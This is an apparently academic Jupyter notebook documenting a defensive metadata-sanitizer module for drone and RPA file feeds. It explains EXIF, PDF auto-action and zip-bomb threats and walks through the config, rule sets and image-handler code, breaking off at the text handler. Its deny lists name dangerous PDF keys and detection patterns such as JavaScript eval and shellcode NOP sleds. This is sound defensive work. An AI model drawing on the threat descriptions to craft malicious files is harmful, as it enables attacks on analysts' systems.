# 🛡️ Metadata Sanitizer — Complete Pipeline
### BEL Project | IIT Bhubaneswar | Detection & Prevention of Malware in RPA/Drone Feeds

---

> **Who is this notebook for?**
> Anyone involved in this project who wants to deeply understand the Metadata Sanitizer module —
> what it is, why every design decision was made, and how the code works line by line.
>
> **You do not need to read anything else.** Every concept is explained here before it is used.
>
> **PI:** Dr. Padmalochan Bera, IIT Bhubaneswar | **Sponsor:** Bharat Electronics Ltd (BEL)

---

| Item | Detail |
|---|---|
| **Module** | Module 5 of 9 — Metadata Sanitizer |
| **Pipeline Position** | After Multi-Layer Malware Detection Engine, before Threat Intelligence Correlator |
| **Purpose** | Scrub potentially harmful metadata from EXIF, PDF, video, archive, and text files |
| **Key Capability** | Threat-score-driven mode selection: strip / selective / audit_only |
| **Dependencies** | Pillow (images), pikepdf (PDFs), mutagen (video) — all optional with graceful fallback |

---
## Section 0 — Background Concepts

> **Read this first.** These terms appear throughout the notebook. They are explained here
> so you never have to look something up elsewhere.

---

### 0.1 What Is Embedded Metadata?

Every file carries two things: the **content** (pixels, text, video frames) and **metadata** —
data *about* the data. Metadata is embedded directly inside the file, invisible to casual users.

| File Type | Metadata Format | Example Fields |
|---|---|---|
| JPEG/TIFF images | **EXIF** (Exchangeable Image File Format) | GPS coordinates, camera make/model, MakerNote, thumbnail |
| PNG images | **tEXt/iTXt chunks** | Author, description, software |
| MP4/MKV video | **Atoms / Tags** | `©xyz` (GPS), `©cmt` (comment), `uuid` (custom data) |
| PDF documents | **Catalog / DocInfo** | `/JavaScript`, `/OpenAction`, `/Author`, `/EmbeddedFiles` |
| ZIP/TAR archives | **Central directory** | Filenames, comments, permission bits |
| Text/JSON | **Encoding markers** | BOM, null bytes, control characters |

**Analogy:** Metadata is like the shipping label on a package. The label is essential for routing,
but an attacker can write anything on it — including instructions that cause the mail room to do
something dangerous.

---

### 0.2 Why Is Metadata a Security Threat?

In our drone/RPA pipeline, files arrive from potentially hostile environments. Metadata is
dangerous because:

| Threat | How It Works | Real-World Example |
|---|---|---|
| **GPS Leakage** | EXIF GPS tags expose drone operating zones and base locations | Military drone images with embedded coordinates |
| **Script Injection** | PDF `/JavaScript` or `/OpenAction` keys execute code when the file is opened | CVE-2009-4324: Adobe Reader JS zero-day |
| **Covert Channels** | MakerNote (arbitrary binary blob) carries hidden payloads | Steganographic data in EXIF MakerNote fields |
| **Exploit Delivery** | Malformed EXIF fields trigger buffer overflows in parsers | CVE-2020-0096: Android EXIF integer overflow |
| **Fingerprinting** | Camera serial numbers, software versions enable tracking | Linking drone operators via unique device IDs |
| **Steganography** | Thumbnail differs from main image; data hidden in metadata fields | Embedded executable in JPEG thumbnail |
| **Zip Bombs** | Archives with compression ratio > 100:1 exhaust memory when extracted | 42.zip: 42 KB compressed → 4.5 PB uncompressed |

---

### 0.3 What Is EXIF Data?

**EXIF** (Exchangeable Image File Format) is the standard metadata format for images.
EXIF data is organized into **IFD groups** (Image File Directories):

```
EXIF Structure
┌────────────────────────────────────────────────────────────┐
│ IFD0 (Main Image)                                         │
│   ImageWidth, ImageHeight, Orientation, Make, Model,       │
│   Software, DateTime, Artist, Copyright                    │
├────────────────────────────────────────────────────────────┤
│ Exif IFD (Capture Details)                                 │
│   ExposureTime, FNumber, ISO, MakerNote, UserComment       │
├────────────────────────────────────────────────────────────┤
│ GPS IFD (⚠️ DANGEROUS — exposes location)                   │
│   GPSLatitude, GPSLongitude, GPSAltitude, GPSTimeStamp     │
├────────────────────────────────────────────────────────────┤
│ IFD1 (Thumbnail)                                           │
│   JPEGInterchangeFormat, JPEGInterchangeFormatLength       │
└────────────────────────────────────────────────────────────┘
```

**Key dangerous fields:**
- **MakerNote**: Vendor-specific binary blob with no standard schema. Can be arbitrarily large.
  Used as a covert data channel because parsers skip over it.
- **UserComment**: Free-text field that can contain scripts or encoded payloads.
- **GPSInfo**: Precise latitude/longitude/altitude — exposes drone operating zones.
- **Thumbnail (IFD1)**: Embedded preview image that can differ from the main image
  (steganography vector) or carry its own separate EXIF with different GPS.

---

### 0.4 What Are PDF Auto-Actions?

PDFs are not just static documents — the PDF specification (ISO 32000) supports
embedded JavaScript, auto-actions, and form scripting. Attackers use these to:

| PDF Key | What It Does | Danger |
|---|---|---|
| `/JavaScript` | Embeds JavaScript in the document | Code execution on open |
| `/OpenAction` | Action that fires when the document is opened | Auto-trigger without user interaction |
| `/Launch` | Launches an external application | Arbitrary program execution |
| `/SubmitForm` | Sends form data to a remote server | Data exfiltration |
| `/EmbeddedFiles` | Files hidden inside the PDF | Malware delivery |
| `/AcroForm`, `/XFA` | Interactive forms with scripting | Complex attack surface |

**Example attack:** A drone telemetry PDF with `/OpenAction` pointing to `/JavaScript`
that phones home with the drone's flight path when opened on the analyst's workstation.

---

### 0.5 What Is a Zip Bomb?

A **zip bomb** is a maliciously crafted archive with extreme compression ratios. When extracted,
it expands to consume all available disk space or memory.

```
Normal ZIP:     1 MB compressed  →  5 MB uncompressed   (ratio 5:1)   ✅ Safe
Suspicious ZIP: 1 MB compressed  →  500 MB uncompressed (ratio 500:1) ⚠️ Suspicious
Zip bomb:       42 KB compressed →  4.5 PB uncompressed (ratio 10⁹:1) ❌ Zip bomb
```

Our archive handler detects zip bombs by checking the **compression ratio**.
If `uncompressed / compressed > 100`, the archive is flagged as a potential zip bomb.

---

### 0.6 What Is Defense-in-Depth?

**Defense-in-depth** means having multiple independent security layers. If one fails, others catch the threat.

```
Why does the Metadata Sanitizer exist AFTER the Malware Detection Engine?

┌─────────────────────────────────────────────────────────────┐
│ Layer 1: Malware Detection Engine                          │
│   Catches KNOWN threats (signatures, AI/ML, sandbox)       │
│   └─ Can miss: zero-days, novel metadata attacks             │
├─────────────────────────────────────────────────────────────┤
│ Layer 2: Metadata Sanitizer (THIS MODULE)                  │
│   Strips dangerous metadata REGARDLESS of detection result  │
│   └─ Even if malware scanner says "clean", we still remove  │
│      GPS, MakerNote, JavaScript, auto-actions, etc.        │
└─────────────────────────────────────────────────────────────┘
```

The malware engine catches known threats via signatures and behavior.
The metadata sanitizer is a **safety net** that removes dangerous metadata fields
regardless of the detection result. Even a "clean" file gets its GPS stripped.

---

### 0.7 Static vs Dynamic Metadata Cleaning

| Approach | What It Does | When We Use It |
|---|---|---|
| **Static cleaning** | Remove/modify metadata fields based on rules and field names | All 5 handlers in this module |
| **Dynamic cleaning** | Execute/render the file, observe side effects, then clean | Sandbox Analyzer (Module 4) |

The Metadata Sanitizer uses **static cleaning** — it reads metadata structures, applies rules,
and writes the cleaned file. It never executes or renders the file content.

---
## Section 1 — Setup & Imports

In [ ]:
# The metadata_sanitizer module uses only stdlib + optional libraries.
# Optional: Pillow (images), pikepdf (PDFs), mutagen (video/audio)
# Install them if you want full handler coverage; the module works without them.

import subprocess, sys
for pkg in ['Pillow', 'piexif']:
    try:
        __import__(pkg.lower().replace('-','_').replace('pillow','PIL'))
    except ImportError:
        subprocess.check_call([sys.executable, '-m', 'pip', 'install', pkg, '-q'])

print('✅ Core dependencies ready')

# Check optional dependencies
for lib, name in [('PIL', 'Pillow'), ('piexif', 'piexif'), ('pikepdf', 'pikepdf'), ('mutagen', 'mutagen')]:
    try:
        __import__(lib)
        print(f'✅ {name} available')
    except ImportError:
        print(f'⚠️ {name} not installed — {name} handler will use fallback mode')

In [ ]:
import os, sys, json, hashlib, shutil, tempfile, zipfile, tarfile, time
from pathlib import Path
from dataclasses import dataclass, field
from typing import List, Dict, Optional, Any, Set
from enum import Enum

# Ensure project root is on the path
PROJECT_ROOT = os.path.dirname(os.path.abspath('.'))
if os.path.basename(os.getcwd()) != 'BTP':
    # Running from inside BTP
    PROJECT_ROOT = os.getcwd()
else:
    PROJECT_ROOT = os.getcwd()

if PROJECT_ROOT not in sys.path:
    sys.path.insert(0, PROJECT_ROOT)

# Import the actual metadata_sanitizer package
from metadata_sanitizer import (
    MetadataSanitizer,
    SanitizerConfig,
    SanitizationMode,
    SanitizationResult,
    BatchSanitizationResult,
    SanitizationChange,
    MetadataSnapshot,
    ChangeAction,
    Severity,
    BaseHandler,
    ImageHandler,
    PdfHandler,
    VideoHandler,
    ArchiveHandler,
    TextHandler,
    get_handler_for_mime,
)

# Import rules
from metadata_sanitizer.rules import (
    EXIF_ALWAYS_STRIP,
    EXIF_STRIP_IN_HIGH_SECURITY,
    EXIF_ALWAYS_PRESERVE,
    EXIF_SIZE_ANOMALY_THRESHOLD,
    get_exif_strip_set,
    PDF_ALWAYS_STRIP_KEYS,
    PDF_DANGEROUS_ACTIONS,
    PDF_SUSPICIOUS_PATTERNS,
    PDF_PRESERVE_KEYS,
    VIDEO_ALWAYS_STRIP_ATOMS,
    VIDEO_STRIP_IN_HIGH_SECURITY,
    VIDEO_ALWAYS_PRESERVE,
    VIDEO_SIZE_ANOMALY_THRESHOLD,
)

# Import handler registry
from metadata_sanitizer.handlers import HANDLER_REGISTRY

print(f'✅ metadata_sanitizer package loaded from: {PROJECT_ROOT}')
print(f'✅ Handlers registered: {len(HANDLER_REGISTRY)} MIME types')

---
## Section 2 — The Big Picture

### 🔵 Theory

Our system has **9 modules**. The Metadata Sanitizer is **Module 5** — it sits between the
Multi-Layer Malware Detection Engine and the Threat Intelligence Correlator.

The Metadata Sanitizer processes **every file that passes malware detection**. Unlike the
sandbox (which only runs on HIGH threat files), the sanitizer runs on ALL files because
metadata threats are different from malware — a file can be malware-free but still leak
GPS coordinates or carry script injection in its EXIF.

### 📊 Full Pipeline Diagram

```
                    DETECTION & PREVENTION PIPELINE
                    ══════════════════════════════

  🚁 Drone / RPA Feed
       │
       ▼
  ┌───────────────────────────────────────────────────┐
  │ ① Ingestion Interceptor                            │
  │   Hashing, MIME validation, size checks             │
  └───────────────────────────────────────────────────┘
       │
       ▼
  ┌───────────────────────────────────────────────────┐
  │ ② Game-Theoretic Threat Estimator                  │
  │   Assigns threat score T_S ∈ [0.0, 1.0]            │
  └───────────────────────────────────────────────────┘
       │
       ▼
  ┌───────────────────────────────────────────────────┐
  │ ③ Inspection Strategy Selector                      │
  │   Routes to appropriate detection layers              │
  └───────────────────────────────────────────────────┘
       │
       ▼
  ┌───────────────────────────────────────────────────┐
  │ ④ Multi-Layer Malware Detection Engine              │
  │   Signature + AI/ML + Sandbox Analysis              │
  └───────────────────────────────────────────────────┘
       │
       ▼
  ╔═══════════════════════════════════════════════════╗
  ║ ⑤ METADATA SANITIZER  ←←← YOU ARE HERE              ║
  ║   Scrubs EXIF, PDF JS, video atoms, archives        ║
  ║   3 modes: strip / selective / audit_only            ║
  ╚═══════════════════════════════════════════════════╝
       │
       ▼
  ┌───────────────────────────────────────────────────┐
  │ ⑥ Threat Intelligence Correlator                    │
  └───────────────────────────────────────────────────┘
       │
       ▼
  ┌───────────────────────────────────────────────────┐
  │ ⑦ Response & Quarantine Manager                     │
  └───────────────────────────────────────────────────┘
       │
       ▼
  ┌───────────────────────────────────────────────────┐
  │ ⑧ Logging & Feedback Loop                           │
  └───────────────────────────────────────────────────┘
       │
       ▼
  ┌───────────────────────────────────────────────────┐
  │ ⑨ Security Dashboard                                │
  └───────────────────────────────────────────────────┘
```

### What Triggers the Metadata Sanitizer?

Every artifact that survives malware detection is passed to the sanitizer. The trigger is the
**ArtifactRecord** from the Ingestion Interceptor, enriched with a **threat score** from the
Game-Theoretic Estimator.

### What Does It Output?

A `SanitizationResult` per artifact containing:
- What mode was used (strip / selective / audit_only)
- What changes were made (field name, action, severity, reason)
- Before/after metadata SHA-256 hashes (forensic trail)
- Whether the file is still valid after sanitization

### Why Is This Separate from the Ingestion Interceptor?

| Aspect | Ingestion Interceptor | Metadata Sanitizer |
|---|---|---|
| **Pipeline position** | Module 1 (first) | Module 5 (after detection) |
| **Purpose** | Validate, hash, store incoming files | Clean embedded metadata |
| **Modifies content?** | No — read-only inspection | Yes — rewrites files |
| **Scope** | File-level properties (size, MIME, hash) | Metadata-level fields (EXIF, PDF keys) |
| **Threat awareness** | Flags suspicious properties | Uses threat score to choose mode |
| **Forensic output** | ArtifactRecord | SanitizationResult |

---
## Section 3 — Configuration

### 🔵 Theory

All tuneable parameters are centralized in a single `SanitizerConfig` dataclass.
This follows the **externalized configuration** pattern — no magic numbers in code.

The most important configuration is the **threat-score-driven mode selection**:

```
Threat Score (T_S) from Game-Theoretic Estimator

  0.0                    0.3                    0.7                    1.0
   │────────────────────┼────────────────────┼────────────────────│
   │    AUDIT ONLY        │     SELECTIVE          │       STRIP          │
   │  (log, don't touch)  │  (remove known-bad)    │  (remove everything) │
   └────────────────────┴────────────────────┴────────────────────┘

  T_S <= 0.3  →  audit_only   (forensic logging only)
  0.3 < T_S < 0.7  →  selective   (remove known-dangerous fields)
  T_S >= 0.7  →  strip        (remove ALL non-essential metadata)
```

In [ ]:
# ─────────────────────────────────────────────────────────────────────────────
# SECTION 3: SanitizerConfig — all 25+ tuneable parameters
# ─────────────────────────────────────────────────────────────────────────────

# Show all configuration fields with their defaults and categories
config = SanitizerConfig()

print('SANITIZER CONFIGURATION')
print('=' * 62)

categories = {
    'Sanitization Mode': ['default_mode', 'high_threat_mode', 'low_threat_mode'],
    'Threat Score Thresholds': ['threat_score_strip_threshold', 'threat_score_audit_threshold'],
    'GPS / Location': ['preserve_gps', 'preserve_camera_serial'],
    'Size Limits': ['max_metadata_size_bytes', 'max_file_size_bytes', 'max_exif_field_bytes'],
    'Verification': ['verify_after_sanitize'],
    'Forensic Preservation': ['preserve_originals', 'original_suffix', 'compute_before_after_hash'],
    'Output': ['output_suffix', 'output_directory'],
    'Logging': ['log_all_metadata', 'log_level', 'structured_logging'],
    'Sandbox': ['sandboxed_execution', 'sandbox_timeout_seconds'],
    'Handler Selection': ['skip_mime_types'],
    'Idempotency': ['skip_already_sanitized', 'sanitization_marker_key', 'sanitization_marker_value'],
}

for category, fields in categories.items():
    print(f'\n  {category}')
    print(f'  {"-" * 40}')
    for f in fields:
        val = getattr(config, f)
        if isinstance(val, set) and len(val) > 3:
            display = f'{{{list(val)[:3]}... ({len(val)} total)}}'
        else:
            display = repr(val)
        print(f'    {f:35s} = {display}')

In [ ]:
# ─── DEMO: Threat-score-driven mode selection ─────────────────────────────────
# Show how different threat scores map to different modes.

print('THREAT SCORE → MODE MAPPING')
print('=' * 50)

test_scores = [0.0, 0.1, 0.2, 0.3, 0.4, 0.5, 0.6, 0.7, 0.8, 0.9, 1.0]
sanitizer = MetadataSanitizer(SanitizerConfig())

for ts in test_scores:
    mode = sanitizer._resolve_mode(threat_score=ts, mode_override=None, insecure_flags=None)
    bar_len = int(ts * 30)
    bar = '█' * bar_len + '░' * (30 - bar_len)
    emoji = '✅' if mode == SanitizationMode.AUDIT_ONLY else '⚠\ufe0f' if mode == SanitizationMode.SELECTIVE else '❌'
    print(f'  T_S={ts:.1f}  [{bar}]  →  {mode.value:12s}  {emoji}')

print()
print('Also: insecure flags can escalate mode:')
mode = sanitizer._resolve_mode(threat_score=None, mode_override=None, insecure_flags=['executable_file'])
print(f'  flags=["executable_file"]  →  {mode.value} (escalated from default)')

---
## Section 4 — Data Models

### 🔵 Theory

All data structures use Python `dataclass` for type safety and immutability.
Every field is documented, every model has a `to_dict()` method for serialization.

```
DATA MODEL HIERARCHY

  SanitizationMode (Enum)          ChangeAction (Enum)        Severity (Enum)
  ├─ STRIP                         ├─ REMOVED                   ├─ INFO
  ├─ SELECTIVE                      ├─ REDACTED                   ├─ LOW
  └─ AUDIT_ONLY                     ├─ NORMALIZED                 ├─ MEDIUM
                                    ├─ TRUNCATED                  ├─ HIGH
                                    └─ FLAGGED                    └─ CRITICAL

  SanitizationChange               MetadataSnapshot
  ├─ field: str                     ├─ fields: Dict
  ├─ action: str                    ├─ total_size_bytes: int
  ├─ reason: str                    ├─ hash_sha256: str
  ├─ severity: str                  └─ field_count: int
  ├─ original_value_preview: str
  └─ original_value_size: int

  SanitizationResult                       BatchSanitizationResult
  ├─ artifact_id: str                       ├─ results: List[SanitizationResult]
  ├─ filename: str                          ├─ total_processed: int
  ├─ file_type / mime_type: str              ├─ total_sanitized: int
  ├─ sanitized: bool                        ├─ total_skipped: int
  ├─ mode: str                              ├─ total_errors: int
  ├─ changes: List[SanitizationChange]       ├─ total_changes: int
  ├─ metadata_before / after: Snapshot       └─ total_processing_time_ms: float
  ├─ file_valid_after_sanitization: bool
  ├─ processing_time_ms: float
  └─ handler_used: str
```

In [ ]:
# ─────────────────────────────────────────────────────────────────────────────
# SECTION 4: Data Models — demonstrate all dataclasses
# ─────────────────────────────────────────────────────────────────────────────

# 1. Enums
print('SANITIZATION MODES')
print('=' * 50)
for mode in SanitizationMode:
    desc = {
        'strip': 'Remove ALL non-essential metadata (aggressive)',
        'selective': 'Remove known-dangerous fields only (balanced)',
        'audit_only': 'Log findings without modification (forensics)',
    }
    print(f'  {mode.value:12s} — {desc[mode.value]}')

print()
print('CHANGE ACTIONS')
print('=' * 50)
for action in ChangeAction:
    print(f'  {action.value:12s} — {action.name}')

print()
print('SEVERITY LEVELS')
print('=' * 50)
for sev in Severity:
    print(f'  {sev.value:12s}')

# 2. Create example SanitizationChange
print()
print('EXAMPLE: SanitizationChange')
print('=' * 50)
change = SanitizationChange(
    field='EXIF.GPSLatitude',
    action='removed',
    reason='gps_data_policy',
    severity='medium',
    original_value_preview='12.9716 N',
    original_value_size=9,
)
print(json.dumps(change.to_dict(), indent=2))

# 3. Create example MetadataSnapshot
print()
print('EXAMPLE: MetadataSnapshot')
print('=' * 50)
snap = MetadataSnapshot(
    fields={'Make': 'DJI', 'Model': 'Mavic 3', 'GPSLatitude': '12.9716'},
    total_size_bytes=128,
    hash_sha256='a1b2c3d4...',
    field_count=3,
)
print(json.dumps(snap.to_dict(), indent=2))

# 4. Create example SanitizationResult
print()
print('EXAMPLE: SanitizationResult')
print('=' * 50)
result = SanitizationResult(
    artifact_id='artifact://drone_04_img_001',
    filename='capture_001.jpg',
    file_type='image',
    mime_type='image/jpeg',
    sanitized=True,
    mode='selective',
    changes=[change],
    handler_used='ImageHandler',
    processing_time_ms=12.5,
)
print(json.dumps(result.to_dict(), indent=2))

---
## Section 5 — Sanitization Rules

### 🔵 Theory

Rules define **which metadata fields to strip, keep, or flag** for each file type.
They are separated from handler logic so they can be reviewed and updated independently.

```
RULE ARCHITECTURE

  rules/
  ├─ exif_rules.py      EXIF tag lists (images)
  │   ├─ EXIF_ALWAYS_STRIP            (GPS, MakerNote, UserComment, ...)
  │   ├─ EXIF_STRIP_IN_HIGH_SECURITY  (SerialNumber, timestamps, ...)
  │   ├─ EXIF_ALWAYS_PRESERVE         (ImageWidth, Orientation, ...)
  │   └─ get_exif_strip_set()         (combines rules by mode)
  │
  ├─ pdf_rules.py       PDF catalog keys and patterns
  │   ├─ PDF_ALWAYS_STRIP_KEYS        (/JavaScript, /OpenAction, /Launch, ...)
  │   ├─ PDF_DANGEROUS_ACTIONS        (/JavaScript, /URI, /SubmitForm, ...)
  │   ├─ PDF_SUSPICIOUS_PATTERNS      (js_eval, shellcode_nop_sled, ...)
  │   └─ PDF_PRESERVE_KEYS            (/Pages, /MediaBox, /Contents, ...)
  │
  └─ video_rules.py     Video atom/tag lists
      ├─ VIDEO_ALWAYS_STRIP_ATOMS     (©xyz, ©cmt, uuid, covr, ...)
      ├─ VIDEO_STRIP_IN_HIGH_SECURITY (©too, ©enc, ©ART, ...)
      └─ VIDEO_ALWAYS_PRESERVE        (moov, trak, mdat, stbl, ...)
```

Each rule set follows the same three-tier pattern:
1. **Always strip** — removed in both `selective` and `strip` modes
2. **Strip in high security** — removed only in `strip` mode
3. **Always preserve** — never removed (needed for correct rendering/playback)

In [ ]:
# ─────────────────────────────────────────────────────────────────────────────
# SECTION 5: Sanitization Rules
# ─────────────────────────────────────────────────────────────────────────────

def print_rule_set(title, rules, max_show=10):
    sorted_rules = sorted(rules)
    print(f'\n{title} ({len(rules)} rules)')
    print('-' * 50)
    for r in sorted_rules[:max_show]:
        print(f'    {r}')
    if len(rules) > max_show:
        print(f'    ... and {len(rules) - max_show} more')

# ── EXIF Rules ──────────────────────────────────────────────────────────────
print('EXIF RULES')
print('=' * 62)

print_rule_set('❌ Always Strip (selective + strip)', EXIF_ALWAYS_STRIP, 12)
print_rule_set('⚠\ufe0f Strip in High Security (strip mode only)', EXIF_STRIP_IN_HIGH_SECURITY, 10)
print_rule_set('✅ Always Preserve (never removed)', EXIF_ALWAYS_PRESERVE, 10)

print(f'\n  Size anomaly threshold: {EXIF_SIZE_ANOMALY_THRESHOLD:,} bytes ({EXIF_SIZE_ANOMALY_THRESHOLD // 1024} KB)')

# ── PDF Rules ───────────────────────────────────────────────────────────────
print('\n\nPDF RULES')
print('=' * 62)

print_rule_set('❌ Always Strip Keys', PDF_ALWAYS_STRIP_KEYS, 12)
print_rule_set('⚠\ufe0f Dangerous Action Types', PDF_DANGEROUS_ACTIONS, 10)
print_rule_set('✅ Preserve Keys', PDF_PRESERVE_KEYS, 10)

print(f'\n  Suspicious patterns to scan in streams:')
for name, pattern in sorted(PDF_SUSPICIOUS_PATTERNS.items()):
    print(f'    {name:25s}  {pattern}')

# ── Video Rules ─────────────────────────────────────────────────────────────
print('\n\nVIDEO RULES')
print('=' * 62)

print_rule_set('❌ Always Strip Atoms', VIDEO_ALWAYS_STRIP_ATOMS, 12)
print_rule_set('⚠\ufe0f Strip in High Security', VIDEO_STRIP_IN_HIGH_SECURITY, 10)
print_rule_set('✅ Always Preserve', VIDEO_ALWAYS_PRESERVE, 10)

print(f'\n  Size anomaly threshold: {VIDEO_SIZE_ANOMALY_THRESHOLD:,} bytes ({VIDEO_SIZE_ANOMALY_THRESHOLD // (1024*1024)} MB)')

In [ ]:
# ─── DEMO: Combined rule sets for different modes ─────────────────────────────
print('COMBINED EXIF STRIP SETS BY MODE')
print('=' * 62)

for mode in ['audit_only', 'selective', 'strip']:
    strip = get_exif_strip_set(mode, preserve_gps=False)
    strip_gps = get_exif_strip_set(mode, preserve_gps=True)
    gps_count = len(strip) - len(strip_gps)
    print(f'\n  Mode: {mode}')
    print(f'    Tags to strip:             {len(strip)}')
    print(f'    With preserve_gps=True:    {len(strip_gps)}  ({gps_count} GPS tags kept)')

---
## Section 6 — Handler Architecture

### 🔵 Theory

The handler system follows the **Strategy Pattern** — each file type has a dedicated handler
that implements the same interface but with file-type-specific logic.

```
HANDLER ROUTING ARCHITECTURE

  Incoming file (MIME type)
       │
       ▼
  ┌────────────────────────────────────────────────┐
  │ HANDLER_REGISTRY                                 │
  │  MIME type  →  Handler class                     │
  ├────────────────────────────────────────────────┤
  │  image/jpeg       → ImageHandler                 │
  │  image/png         → ImageHandler                 │
  │  video/mp4         → VideoHandler                 │
  │  application/pdf   → PdfHandler                   │
  │  application/zip   → ArchiveHandler               │
  │  text/plain        → TextHandler                  │
  │  application/json  → TextHandler                  │
  │  (unknown)         → TextHandler (fallback)       │
  └────────────────────────────────────────────────┘

  BaseHandler (Abstract)
  ├─ extract_metadata(file_path)  → Dict[str, Any]
  ├─ sanitize(file_path, output_path, mode)  → List[SanitizationChange]
  ├─ verify(file_path)  → bool
  ├─ is_available()     → bool   (class method)
  └─ handler_name()     → str    (class method)
```

**Key design: Optional dependency pattern.** Handlers for images (Pillow/piexif),
PDFs (pikepdf), and video (mutagen) check `is_available()` at runtime.
If the library is not installed, the handler gracefully reports unavailability
and the orchestrator skips the file with an appropriate warning.

In [ ]:
# ─────────────────────────────────────────────────────────────────────────────
# SECTION 6: Handler Architecture
# ─────────────────────────────────────────────────────────────────────────────

# Show all 5 handlers and their availability status
print('HANDLER AVAILABILITY')
print('=' * 62)

handlers = [
    ('ImageHandler', ImageHandler),
    ('TextHandler', TextHandler),
    ('ArchiveHandler', ArchiveHandler),
    ('PdfHandler', PdfHandler),
    ('VideoHandler', VideoHandler),
]

for name, cls in handlers:
    available = cls.is_available()
    emoji = '✅' if available else '⚠\ufe0f'
    dep = {
        'ImageHandler': 'Pillow (PIL)',
        'TextHandler': 'stdlib (always available)',
        'ArchiveHandler': 'stdlib (always available)',
        'PdfHandler': 'pikepdf',
        'VideoHandler': 'mutagen',
    }
    mimes = sorted(cls(SanitizerConfig()).supported_mimes())
    print(f'  {emoji} {name:20s}  dep={dep[name]:25s}  mimes={len(mimes)}')
    for m in mimes[:4]:
        print(f'      {m}')
    if len(mimes) > 4:
        print(f'      ... and {len(mimes) - 4} more')

# Show handler registry (MIME → handler routing)
print(f'\n\nHANDLER REGISTRY ({len(HANDLER_REGISTRY)} entries)')
print('=' * 62)
for mime, handler_cls in sorted(HANDLER_REGISTRY.items()):
    print(f'  {mime:35s} → {handler_cls.__name__}')

In [ ]:
# ─── DEMO: Handler routing for different MIME types ──────────────────────────
print('HANDLER ROUTING DEMO')
print('=' * 62)

test_mimes = [
    'image/jpeg',
    'image/png',
    'video/mp4',
    'video/x-matroska',
    'application/pdf',
    'application/zip',
    'text/plain',
    'application/json',
    'audio/mpeg',
    'application/octet-stream',   # unknown
    'image/webp',                 # unregistered image type
]

for mime in test_mimes:
    handler_cls = get_handler_for_mime(mime)
    available = handler_cls.is_available()
    status = '✅ ready' if available else '⚠\ufe0f unavailable'
    print(f'  {mime:30s} → {handler_cls.__name__:20s} [{status}]')

---
## Section 7 — Image Handler

### 🔵 Theory

The Image Handler is responsible for sanitizing EXIF metadata in JPEG, PNG, TIFF, and BMP files.
This is the most important handler because **drone cameras embed extensive EXIF data** including
GPS coordinates, device serial numbers, and vendor-specific MakerNote blobs.

**EXIF threats in drone feeds:**

| Threat | EXIF Field | Risk |
|---|---|---|
| GPS leakage | GPSLatitude, GPSLongitude, GPSAltitude | Exposes drone operating zones |
| MakerNote payloads | MakerNote (vendor binary blob) | Arbitrary data, no schema validation |
| Thumbnail steganography | JPEGInterchangeFormat | Thumbnail can differ from main image |
| Script injection | UserComment, ImageDescription | Free-text fields can carry scripts |
| Device fingerprinting | BodySerialNumber, CameraOwnerName | Links images to specific drones |

### 📊 How Sanitization Works

```
IMAGE SANITIZATION STRATEGY

  Is piexif installed?
       │
  ┌───┴───┐
  │  YES  │ → Surgical removal: remove only specific EXIF tags
  │       │   from the strip set while preserving essential ones
  │       │   (Orientation, ColorSpace, ImageWidth, etc.)
  └───────┘
  ┌───────┐
  │  NO   │ → Fallback: strip ALL EXIF by re-saving the image
  │       │   without metadata (Pillow only). Less precise but
  │       │   preserves ICC profiles and image quality.
  └───────┘
```

In [ ]:
# ─────────────────────────────────────────────────────────────────────────────
# SECTION 7: Image Handler — Demo
# ─────────────────────────────────────────────────────────────────────────────

demo_dir = tempfile.mkdtemp(prefix='img_handler_demo_')

try:
    from PIL import Image
    _PIL_OK = True
except ImportError:
    _PIL_OK = False

if _PIL_OK:
    # Create a sample JPEG image with basic metadata
    img = Image.new('RGB', (100, 100), color=(0, 128, 255))
    img_path = os.path.join(demo_dir, 'drone_capture.jpg')
    img.save(img_path, 'JPEG', quality=95)

    # Add EXIF data if piexif is available
    try:
        import piexif
        exif_dict = piexif.load(img_path)
        # Add GPS data (simulating drone capture)
        exif_dict['GPS'] = {
            piexif.GPSIFD.GPSLatitudeRef: b'N',
            piexif.GPSIFD.GPSLatitude: ((12, 1), (58, 1), (1791, 100)),
            piexif.GPSIFD.GPSLongitudeRef: b'E',
            piexif.GPSIFD.GPSLongitude: ((77, 1), (35, 1), (2436, 100)),
            piexif.GPSIFD.GPSAltitude: (120, 1),
            piexif.GPSIFD.GPSAltitudeRef: 0,
        }
        # Add MakerNote (simulating vendor data)
        exif_dict['Exif'][piexif.ExifIFD.MakerNote] = b'\x00' * 256
        # Add UserComment
        exif_dict['Exif'][piexif.ExifIFD.UserComment] = b'ASCII\x00\x00\x00Flight log entry 42'
        # Add software info
        exif_dict['0th'][piexif.ImageIFD.Software] = b'DJI Mavic 3 v2.1'
        exif_dict['0th'][piexif.ImageIFD.Make] = b'DJI'
        exif_dict['0th'][piexif.ImageIFD.Model] = b'Mavic 3'

        exif_bytes = piexif.dump(exif_dict)
        piexif.insert(exif_bytes, img_path)
        print('✅ Created sample JPEG with GPS, MakerNote, UserComment, Software EXIF')
    except ImportError:
        print('⚠\ufe0f piexif not available — image created without EXIF injection')

    # Extract metadata using ImageHandler
    config = SanitizerConfig(log_level='WARNING')
    handler = ImageHandler(config)

    print(f'\nEXTRACTED METADATA (before sanitization):')
    print('-' * 50)
    metadata = handler.extract_metadata(img_path)
    for key, value in sorted(metadata.items()):
        print(f'  {key:30s} = {str(value)[:60]}')

    # Show what would be stripped in each mode
    for mode_name in ['audit_only', 'selective', 'strip']:
        strip_set = get_exif_strip_set(mode_name, preserve_gps=False)
        would_strip = [k for k in metadata if k in strip_set and not k.startswith('_')]
        print(f'\n  Mode "{mode_name}" would strip: {would_strip or "(none)"}')

    # Actually sanitize in selective mode
    output_path = os.path.join(demo_dir, 'drone_capture_clean.jpg')
    shutil.copy2(img_path, output_path)
    changes = handler.sanitize(output_path, output_path, SanitizationMode.SELECTIVE)

    print(f'\n\nSANITIZATION RESULT (selective mode):')
    print('=' * 50)
    print(f'  Changes made: {len(changes)}')
    for c in changes:
        print(f'  [{c.severity:8s}] {c.field}: {c.action} ({c.reason})')

    # Show metadata after
    after = handler.extract_metadata(output_path)
    print(f'\nMETADATA AFTER sanitization:')
    print('-' * 50)
    for key, value in sorted(after.items()):
        print(f'  {key:30s} = {str(value)[:60]}')

    # Verify
    valid = handler.verify(output_path)
    print(f'\n  File valid after sanitization: {valid} {"✅" if valid else "❌"}')

else:
    print('⚠\ufe0f Pillow not installed — Image Handler demo skipped')
    print('  Install with: pip install Pillow piexif')

shutil.rmtree(demo_dir, ignore_errors=True)

---
## Section 8 — Text Handler

### 🔵 Theory

The Text Handler sanitizes plain text, CSV, and JSON telemetry files. It uses only
